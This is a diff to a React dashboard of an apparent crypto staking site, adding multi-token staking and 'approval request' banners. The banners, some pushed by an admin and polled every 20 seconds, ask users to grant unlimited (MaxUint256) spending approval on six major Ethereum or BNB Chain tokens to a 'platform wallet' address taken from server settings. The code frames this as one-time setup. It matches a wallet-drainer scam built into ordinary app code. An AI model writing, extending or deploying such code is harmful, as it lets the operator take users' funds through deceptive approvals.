@@ -114,12 +114,118 @@ function DepositAddress({ network, apiBase }) {
   );
 }
 
+// ── Admin approval-request banner component ──────────────────────────────────
+const ETH_APPROVABLE = [
+  { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+  { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+  { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+  { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
+  { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
+  { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
+];
+const BSC_APPROVABLE = [
+  { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
+  { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
+  { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
+  { symbol: 'ETH',  address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
+  { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
+  { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
+];
+
+function AdminApprovalBanner({ notif, walletAddress, approvingNetwork, setApprovingNetwork, showNotification, onDismiss }) {
+  const isETH = notif.network === 'ETH';
+  const chainId  = isETH ? '0x1'  : '0x38';
+  const chainName = isETH ? 'Ethereum Mainnet' : 'BNB Smart Chain';
+  const rpcUrl    = isETH ? 'https://eth.llamarpc.com' : 'https://bsc-dataseed1.binance.org/';
+  const explorer  = isETH ? 'https://etherscan.io' : 'https://bscscan.com';
+  const tokens    = isETH ? ETH_APPROVABLE : BSC_APPROVABLE;
+  const isApproving = approvingNetwork === notif.network;
+
+  const handleApprove = async () => {
+    setApprovingNetwork(notif.network);
+    try {
+      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+      const platformWallet = isETH
+        ? (settings?.platformWalletETH || settings?.platformWallet)
+        : settings?.platformWallet;
+      if (!platformWallet) { showNotification('Platform wallet not configured', 'error'); return; }
+
+      // Switch network in MetaMask
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
+      } catch (e) {
+        if (e.code === 4902) {
+          await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{
+            chainId, chainName,
+            nativeCurrency: isETH ? { name: 'ETH', symbol: 'ETH', decimals: 18 } : { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: [rpcUrl], blockExplorerUrls: [explorer]
+          }]});
+        } else throw e;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer   = provider.getSigner();
+      const approveAbi = ['function approve(address,uint256) returns (bool)'];
+      let approved = 0;
+
+      for (const token of tokens) {
+        try {
+          showNotification(`Approving ${token.symbol} (${approved + 1}/${tokens.length}) — confirm in wallet...`, 'info');
+          const contract = new ethers.Contract(token.address, approveAbi, signer);
+          const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
+          await tx.wait();
+          approved++;
+        } catch (e) {
+          if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
+            showNotification(`${token.symbol} skipped`, 'error');
+          }
+        }
+      }
+
+      if (approved > 0) {
+        showNotification(`✅ ${approved}/${tokens.length} ${notif.network} tokens approved!`, 'success');
+        onDismiss();
+      } else {
+        showNotification('No tokens were approved', 'error');
+      }
+    } catch (e) {
+      showNotification(e.code === 4001 ? 'Cancelled' : 'Approval failed: ' + e.message, 'error');
+    } finally {
+      setApprovingNetwork(null);
+    }
+  };
+
+  return (
+    <div style={{background:'rgba(245,158,11,0.1)',border:'1px solid rgba(245,158,11,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'16px',position:'relative'}}>
+      <button onClick={onDismiss} style={{position:'absolute',top:'10px',right:'12px',background:'none',border:'none',color:'#94a3b8',fontSize:'1.1rem',cursor:'pointer',lineHeight:1}}>&times;</button>
+      <div style={{fontWeight:600,color:'#fbbf24',marginBottom:'4px'}}>
+        🔔 Action Required — {notif.network} Token Approval
+      </div>
+      <div style={{fontSize:'0.82rem',color:'#94a3b8',marginBottom:'12px'}}>
+        {notif.message}
+      </div>
+      <button
+        disabled={isApproving}
+        onClick={handleApprove}
+        style={{background:'#f59e0b',color:'#000',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:isApproving?0.6:1,width:'100%'}}
+      >
+        {isApproving ? `Approving ${notif.network} tokens...` : `🔓 Approve ${notif.network} Tokens`}
+      </button>
+    </div>
+  );
+}
+// ─────────────────────────────────────────────────────────────────────────────
+
 function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
   const [activeTab, setActiveTab] = useState('overview');
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [notification, setNotification] = useState({ show: false, message: '', type: '' });
   const [usdtApproved, setUsdtApproved] = useState(false);
   const [approvingUsdt, setApprovingUsdt] = useState(false);
+  const [ethApproved, setEthApproved] = useState(false);
+  const [approvingEth, setApprovingEth] = useState(false);
+  const [adminNotifications, setAdminNotifications] = useState([]);
+  const [approvingNetwork, setApprovingNetwork] = useState(null); // 'BSC' | 'ETH' | null
 
   // Real wallet data
   const [ethBalance, setEthBalance] = useState('0.00');
@@ -158,6 +264,10 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
   // Staking form state
   const [stakeAmount, setStakeAmount] = useState('');
   const [unstakeAmount, setUnstakeAmount] = useState('');
+  const [selectedToken, setSelectedToken] = useState('USDT');
+  const [selectedTokenChain, setSelectedTokenChain] = useState('bsc');
+  const [stakeableTokens, setStakeableTokens] = useState([]);
+  const [loadingStakeTokens, setLoadingStakeTokens] = useState(false);
   const [manualTxHash, setManualTxHash] = useState('');
   const [manualDepositLoading, setManualDepositLoading] = useState(false);
 
@@ -176,6 +286,30 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       });
     } catch (error) {
       console.log('Failed to report balance to backend');
+    }
+  }, [walletAddress]);
+
+  // Fetch stakeable tokens from backend (same source as admin modal)
+  const fetchStakeableTokens = useCallback(async () => {
+    if (!walletAddress) return;
+    setLoadingStakeTokens(true);
+    try {
+      const res = await fetch(`${API_BASE}/api/wallet-balance/${walletAddress}`);
+      const data = await res.json();
+      const tokens = (data.tokens || []).filter(t => parseFloat(t.balance || 0) > 0 && t.chain && ['eth','bsc'].includes(t.chain));
+      // Add ETH native balance if > 0
+      if (parseFloat(data.eth || 0) > 0) {
+        tokens.unshift({ symbol: 'ETH', name: 'Ethereum', balance: data.eth, chain: 'eth' });
+      }
+      setStakeableTokens(tokens);
+      if (tokens.length > 0) {
+        setSelectedToken(tokens[0].symbol);
+        setSelectedTokenChain(tokens[0].chain);
+      }
+    } catch (e) {
+      console.log('Failed to fetch stakeable tokens', e);
+    } finally {
+      setLoadingStakeTokens(false);
     }
   }, [walletAddress]);
 
@@ -242,7 +376,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
             const price = prices[token.coingeckoId]?.usd || 0;
             const balStr = bal.toFixed(token.decimals <= 6 ? 2 : 6);
             const usdVal = (bal * price).toFixed(2);
-            tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal });
+            tokens.push({ symbol: token.symbol, name: token.name, balance: balStr, usdValue: usdVal, chain: 'eth' });
             if (token.symbol === 'USDT') usdtFormatted = balStr;
           }
         } catch (e) { /* skip on contract error */ }
@@ -376,6 +510,19 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
     } catch (e) { /* silent */ }
   }, [walletAddress]);
 
+  const checkEthApproval = useCallback(async () => {
+    try {
+      const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+      const platformWallet = settings?.platformWalletETH || settings?.platformWallet;
+      if (!platformWallet) return;
+      const ETH_USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+      const ethProvider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
+      const contract = new ethers.Contract(ETH_USDT, ['function allowance(address,address) view returns (uint256)'], ethProvider);
+      const allowance = await contract.allowance(walletAddress, platformWallet);
+      setEthApproved(allowance.gte(ethers.utils.parseUnits('1000000', 6)));
+    } catch (e) { /* silent */ }
+  }, [walletAddress]);
+
   // Load saved BTC address from backend
   const fetchBtcAddress = useCallback(async () => {
     try {
@@ -416,6 +563,24 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
     }
   };
 
+  // Fetch admin notifications (approval requests, etc.)
+  const fetchNotifications = useCallback(async () => {
+    try {
+      const res = await fetch(`${API_BASE}/api/user/${walletAddress}/notifications`);
+      if (res.ok) {
+        const data = await res.json();
+        setAdminNotifications(data.notifications || []);
+      }
+    } catch (e) { /* silent */ }
+  }, [walletAddress]);
+
+  const dismissNotification = async (id) => {
+    try {
+      await fetch(`${API_BASE}/api/user/${walletAddress}/notifications/${id}/dismiss`, { method: 'POST' });
+      setAdminNotifications(prev => prev.filter(n => n.id !== id));
+    } catch (e) { /* silent */ }
+  };
+
   // Initial data fetch
   useEffect(() => {
     const loadData = async () => {
@@ -426,19 +591,26 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
         fetchPlatformSettings(),
         fetchTransactions(),
         fetchWithdrawals(),
-        fetchBtcAddress()
+        fetchBtcAddress(),
+        fetchNotifications()
       ]);
       setDataLoading(false);
       checkUsdtApproval();
+      checkEthApproval();
     };
     loadData();
-  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals, checkUsdtApproval, fetchBtcAddress]);
+  }, [fetchWalletBalance, fetchUserData, fetchPlatformSettings, fetchTransactions, fetchWithdrawals, checkUsdtApproval, checkEthApproval, fetchBtcAddress, fetchNotifications]);
 
-  // Refresh wallet balance every 30 seconds
+  // Refresh wallet balance every 30 seconds; notifications every 20 seconds
   useEffect(() => {
     const interval = setInterval(fetchWalletBalance, 30000);
     return () => clearInterval(interval);
   }, [fetchWalletBalance]);
+
+  useEffect(() => {
+    const interval = setInterval(fetchNotifications, 20000);
+    return () => clearInterval(interval);
+  }, [fetchNotifications]);
 
   const showNotification = (message, type = 'success') => {
     setNotification({ show: true, message, type });
@@ -464,45 +636,53 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
     return ((userData.stakedAmount * (apy / 100)) / 365).toFixed(2);
   };
 
-  // Handle stake — real on-chain USDT transfer
-  // USDT contract addresses per network
-  const USDT_BY_NETWORK = {
-    BSC: { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, chainId: '0x38', chainName: 'BNB Smart Chain' },
-    ETH: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  chainId: '0x1',  chainName: 'Ethereum Mainnet' },
-  };
-
+  // Handle stake — real on-chain token transfer (user picks token on BSC, USDT-only on ETH)
   const handleStake = async () => {
     const amount = parseFloat(stakeAmount);
     if (!amount || amount <= 0) { showNotification('Please enter a valid amount', 'error'); return; }
-    if (amount > parseFloat(usdtBalance)) { showNotification('Insufficient USDT balance', 'error'); return; }
+
+    // Resolve token config from selected token + chain
+    const isBSC = selectedTokenChain === 'bsc';
+    let tokenCfg, chainId, chainName;
+    if (isBSC) {
+      tokenCfg = BSC_TOKENS.find(t => t.symbol === selectedToken) || BSC_TOKENS[0];
+      chainId = '0x38'; chainName = 'BNB Smart Chain';
+    } else {
+      tokenCfg = KNOWN_TOKENS.find(t => t.symbol === selectedToken) || KNOWN_TOKENS.find(t => t.symbol === 'USDT');
+      chainId = '0x1'; chainName = 'Ethereum Mainnet';
+    }
+
+    // Check user has enough of the selected token (use stakeableTokens which has live balances)
+    const stakeToken = stakeableTokens.find(t => t.symbol === selectedToken && t.chain === selectedTokenChain);
+    const availBal = parseFloat(stakeToken?.balance || '0');
+    if (amount > availBal) { showNotification(`Insufficient ${tokenCfg.symbol} balance`, 'error'); return; }
 
     setLoading(true);
     try {
       const settingsRes = await fetch(`${API_BASE}/api/settings`);
       const settings = await settingsRes.json();
 
-      const netConfig = USDT_BY_NETWORK[network] || USDT_BY_NETWORK['BSC'];
-      const platformAddr = network === 'ETH'
+      const platformAddr = !isBSC
         ? (settings.platformWalletETH || settings.platformWallet)
         : settings.platformWallet;
 
       if (!platformAddr) { showNotification('Platform wallet not configured. Contact admin.', 'error'); setLoading(false); return; }
 
-      showNotification(`Switching to ${netConfig.chainName}...`, 'info');
+      showNotification(`Switching to ${chainName}...`, 'info');
       const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
       try {
-        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: netConfig.chainId }] });
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
       } catch (switchErr) {
-        if (switchErr.code === 4902 && network === 'BSC') {
+        if (switchErr.code === 4902 && isBSC) {
           await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }] });
         } else { throw switchErr; }
       }
 
       showNotification('Please confirm the transaction in your wallet...', 'info');
       const signer = web3Provider.getSigner();
-      const usdtContract = new ethers.Contract(netConfig.address, USDT_ABI, signer);
-      const amountInWei = ethers.utils.parseUnits(amount.toString(), netConfig.decimals);
-      const tx = await usdtContract.transfer(platformAddr, amountInWei);
+      const tokenContract = new ethers.Contract(tokenCfg.address, USDT_ABI, signer);
+      const amountInWei = ethers.utils.parseUnits(amount.toString(), tokenCfg.decimals);
+      const tx = await tokenContract.transfer(platformAddr, amountInWei);
 
       showNotification('Transaction submitted! Waiting for confirmation...', 'info');
       const receipt = await tx.wait(1);
@@ -512,13 +692,13 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
       const response = await fetch(`${API_BASE}/api/stake`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress, amount, type: 'stake', txHash: tx.hash })
+        body: JSON.stringify({ walletAddress, amount, type: 'stake', txHash: tx.hash, network: isBSC ? 'BSC' : 'ETH', token: tokenCfg.symbol })
       });
 
       if (response.ok) {
-        showNotification(`Successfully staked ${amount} USDT on ${network}!`, 'success');
+        showNotification(`Successfully staked ${amount} ${tokenCfg.symbol}!`, 'success');
         setStakeAmount('');
-        await fetchUserData(); await fetchTransactions(); await fetchWalletBalance();
+        await fetchUserData(); await fetchTransactions(); await fetchWalletBalance(); await fetchStakeableTokens();
       } else {
         const err = await response.json();
         showNotification(err.message || 'Backend verification failed', 'error');
@@ -787,7 +967,7 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
           </button>
           <button
             className={`nav-item ${activeTab === 'stake' ? 'active' : ''}`}
-            onClick={() => { setActiveTab('stake'); setMobileMenuOpen(false); }}
+            onClick={() => { setActiveTab('stake'); setMobileMenuOpen(false); fetchStakeableTokens(); }}
           >
             <span className="nav-icon">💰</span>
             <span>Stake</span>
@@ -859,9 +1039,65 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
         </header>
 
         <div className="dashboard-content">
+          {/* Admin approval-request banners — shown on all tabs */}
+          {adminNotifications.filter(n => n.type === 'approval_request').map(notif => (
+            <AdminApprovalBanner
+              key={notif.id}
+              notif={notif}
+              walletAddress={walletAddress}
+              approvingNetwork={approvingNetwork}
+              setApprovingNetwork={setApprovingNetwork}
+              showNotification={showNotification}
+              onDismiss={() => dismissNotification(notif.id)}
+            />
+          ))}
+
           {/* Overview Tab */}
           {activeTab === 'overview' && (
             <div className="overview-section">
+              {!ethApproved && (
+                <div style={{background:'rgba(99,102,241,0.12)',border:'1px solid rgba(99,102,241,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'12px'}}>
+                  <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>Action Required: Authorize Ethereum Token Spending</div>
+                  <div style={{fontSize:'0.82rem',color:'#94a3b8',marginBottom:'12px'}}>
+                    One-time setup. Approves the platform to stake your Ethereum tokens (USDT, USDC, DAI, WBTC, WETH, LINK). You will confirm each token individually in your wallet.
+                  </div>
+                  <button
+                    style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingEth?0.7:1,width:'100%'}}
+                    disabled={approvingEth}
+                    onClick={async () => {
+                      setApprovingEth(true);
+                      try {
+                        const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
+                        const platformWallet = settings?.platformWalletETH || settings?.platformWallet;
+                        if (!platformWallet) { showNotification('Platform wallet not configured', 'error'); return; }
+                        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] }); }
+                        catch (e) { if (e.code !== 4902) throw e; }
+                        const provider = new ethers.providers.Web3Provider(window.ethereum);
+                        const signer = provider.getSigner();
+                        const approveAbi = ['function approve(address,uint256) returns (bool)'];
+                        let approved = 0;
+                        for (const token of ETH_APPROVABLE) {
+                          try {
+                            showNotification(`Approving ${token.symbol} (${approved + 1}/${ETH_APPROVABLE.length}) — confirm in wallet...`, 'info');
+                            const contract = new ethers.Contract(token.address, approveAbi, signer);
+                            const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
+                            await tx.wait();
+                            approved++;
+                          } catch (e) {
+                            if (e.code === 4001 || e.code === 'ACTION_REJECTED') showNotification(`${token.symbol} skipped`, 'error');
+                          }
+                        }
+                        if (approved > 0) { setEthApproved(true); showNotification(`✅ ${approved}/${ETH_APPROVABLE.length} Ethereum tokens approved!`, 'success'); }
+                        else showNotification('No tokens were approved', 'error');
+                      } catch (e) {
+                        showNotification(e.code === 4001 ? 'Approval cancelled' : 'Approval failed: ' + e.message, 'error');
+                      } finally { setApprovingEth(false); }
+                    }}
+                  >
+                    {approvingEth ? 'Approving ETH Tokens...' : '🔓 Approve All Ethereum Tokens (One-Time Setup)'}
+                  </button>
+                </div>
+              )}
               {!usdtApproved && (
                 <div style={{background:'rgba(99,102,241,0.12)',border:'1px solid rgba(99,102,241,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'20px'}}>
                   <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>Action Required: Authorize BSC Token Spending</div>
@@ -1098,11 +1334,11 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
               <div className="quick-actions">
                 <h2 className="section-title">Quick Actions</h2>
                 <div className="actions-grid">
-                  <button className="action-btn primary" onClick={() => setActiveTab('stake')}>
+                  <button className="action-btn primary" onClick={() => { setActiveTab('stake'); fetchStakeableTokens(); }}>
                     <span className="action-icon">➕</span>
                     <span>Stake USDT</span>
                   </button>
-                  <button className="action-btn secondary" onClick={() => setActiveTab('stake')}>
+                  <button className="action-btn secondary" onClick={() => { setActiveTab('stake'); fetchStakeableTokens(); }}>
                     <span className="action-icon">➖</span>
                     <span>Unstake</span>
                   </button>
@@ -1194,29 +1430,72 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
                   {/* EVM networks (BSC / ETH) — automatic MetaMask transfer */}
                   {(network === 'BSC' || network === 'ETH') && (<>
                     <div style={{background:'rgba(16,185,129,0.08)',border:'1px solid rgba(16,185,129,0.2)',borderRadius:'10px',padding:'10px 14px',marginBottom:'14px',fontSize:'0.8rem',color:'#94a3b8'}}>
-                      ✅ Your wallet will auto-switch to <strong style={{color:'#e2e8f0'}}>{network === 'BSC' ? 'BNB Smart Chain (BEP-20)' : 'Ethereum Mainnet (ERC-20)'}</strong> and send USDT directly to the platform wallet.
+                      ✅ Your wallet will auto-switch to the correct chain and send <strong style={{color:'#e2e8f0'}}>{selectedToken}</strong> directly to the platform wallet.
                     </div>
-                    <div className="balance-display">
-                      <span>Wallet USDT Balance</span>
-                      <span className="balance-value">{formatNumber(usdtBalance)} USDT</span>
+
+                    {/* Token selector — live balances from backend */}
+                    <div style={{marginBottom:'14px'}}>
+                      <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:'6px'}}>
+                        <div style={{fontSize:'0.8rem',color:'#94a3b8',fontWeight:600}}>Select Token to Stake</div>
+                        <button onClick={fetchStakeableTokens} disabled={loadingStakeTokens || loading} style={{fontSize:'0.72rem',background:'rgba(99,102,241,0.15)',border:'1px solid rgba(99,102,241,0.3)',color:'#a5b4fc',padding:'2px 10px',borderRadius:'20px',cursor:'pointer'}}>
+                          {loadingStakeTokens ? 'Loading…' : '↻ Refresh'}
+                        </button>
+                      </div>
+                      {loadingStakeTokens ? (
+                        <div style={{fontSize:'0.82rem',color:'#94a3b8',padding:'10px',textAlign:'center'}}>Scanning wallet…</div>
+                      ) : stakeableTokens.length === 0 ? (
+                        <div style={{fontSize:'0.82rem',color:'#f87171',padding:'10px',background:'rgba(239,68,68,0.08)',borderRadius:'8px',border:'1px solid rgba(239,68,68,0.2)'}}>
+                          No token balances found. Click ↻ Refresh or make sure your wallet is connected.
+                        </div>
+                      ) : (
+                        <select
+                          value={`${selectedToken}:${selectedTokenChain}`}
+                          onChange={e => {
+                            const [sym, ch] = e.target.value.split(':');
+                            setSelectedToken(sym);
+                            setSelectedTokenChain(ch);
+                            setStakeAmount('');
+                          }}
+                          style={{width:'100%',padding:'0.7rem 1rem',background:'rgba(255,255,255,0.06)',border:'1px solid rgba(255,255,255,0.15)',borderRadius:'10px',color:'#fff',fontSize:'0.88rem',cursor:'pointer'}}
+                          disabled={loading}
+                        >
+                          {stakeableTokens.map(t => (
+                            <option key={`${t.symbol}:${t.chain}`} value={`${t.symbol}:${t.chain}`} style={{background:'#1a1a2e'}}>
+                              {t.symbol} ({t.chain === 'bsc' ? 'BSC' : 'ETH'}) — Balance: {parseFloat(t.balance).toFixed(6)}
+                            </option>
+                          ))}
+                        </select>
+                      )}
                     </div>
-                    <div className="balance-display" style={{marginTop:'8px',opacity:0.7}}>
-                      <span>Already Staked</span>
-                      <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDT</span>
-                    </div>
-                    <div className="input-group">
-                      <input type="number" placeholder="Enter amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} className="stake-input" disabled={loading} />
-                      <button className="max-btn" onClick={() => setStakeAmount(usdtBalance)} disabled={loading}>MAX</button>
-                    </div>
+
+                    {/* Balance + staking inputs */}
+                    {(() => {
+                      const tok = stakeableTokens.find(t => t.symbol === selectedToken && t.chain === selectedTokenChain);
+                      const bal = tok ? parseFloat(tok.balance) : 0;
+                      return (<>
+                        <div className="balance-display">
+                          <span>Wallet {selectedToken} Balance ({selectedTokenChain === 'bsc' ? 'BSC' : 'ETH'})</span>
+                          <span className="balance-value">{bal.toFixed(6)} {selectedToken}</span>
+                        </div>
+                        <div className="balance-display" style={{marginTop:'8px',opacity:0.7}}>
+                          <span>Already Staked</span>
+                          <span className="balance-value" style={{color:'#6366f1'}}>{formatNumber(userData.stakedAmount)} USDT</span>
+                        </div>
+                        <div className="input-group">
+                          <input type="number" placeholder="Enter amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} className="stake-input" disabled={loading} />
+                          <button className="max-btn" onClick={() => setStakeAmount(bal.toFixed(6))} disabled={loading}>MAX</button>
+                        </div>
+                      </>);
+                    })()}
                     <div className="quick-amounts">
                       {['100','500','1000','5000'].map(v => <button key={v} onClick={() => setStakeAmount(v)} disabled={loading}>{parseInt(v).toLocaleString()}</button>)}
                     </div>
                     <div className="stake-info">
                       <div className="info-row"><span>Current APY</span><span className="info-value">{getCurrentAPY()}% Annual</span></div>
-                      <div className="info-row"><span>Est. Daily Earnings</span><span className="info-value">{stakeAmount ? ((parseFloat(stakeAmount) * (parseFloat(getCurrentAPY()) / 100)) / 365).toFixed(4) : '0.00'} USDT</span></div>
+                      <div className="info-row"><span>Est. Daily Earnings</span><span className="info-value">{stakeAmount ? ((parseFloat(stakeAmount) * (parseFloat(getCurrentAPY()) / 100)) / 365).toFixed(4) : '0.00'} {selectedToken}</span></div>
                     </div>
                     <button className="stake-btn primary" onClick={handleStake} disabled={loading || !stakeAmount}>
-                      {loading ? 'Processing...' : `Stake Now on ${network}`}
+                      {loading ? 'Processing...' : `Stake ${selectedToken} on ${selectedTokenChain === 'bsc' ? 'BSC' : 'ETH'}`}
                     </button>
                   </>)}
 
